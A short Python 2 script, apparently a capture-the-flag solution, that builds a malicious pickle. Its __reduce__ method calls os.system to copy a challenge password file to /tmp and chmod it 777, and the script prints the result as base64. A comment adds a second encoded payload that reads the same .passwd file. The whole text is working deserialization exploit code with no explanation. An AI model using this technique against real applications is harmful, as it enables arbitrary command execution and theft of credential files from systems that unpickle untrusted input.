import base64
import cPickle
import os

class RunCmd(object):
    def __reduce__(self):
        return (os.system, ('cp /challenge/app-script/ch5/.passwd /tmp/wr47h5/ch5_passwd; chmod 777 /tmp/wr47h5/ch5_passwd',))

print base64.b64encode(cPickle.dumps(RunCmd()))

# payload : Y3Bvc2l4CnN5c3RlbQpwMQooUydjYXQgL2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoNS8ucGFzc3dkID4mNCcKcDIKdHAzClJwNAou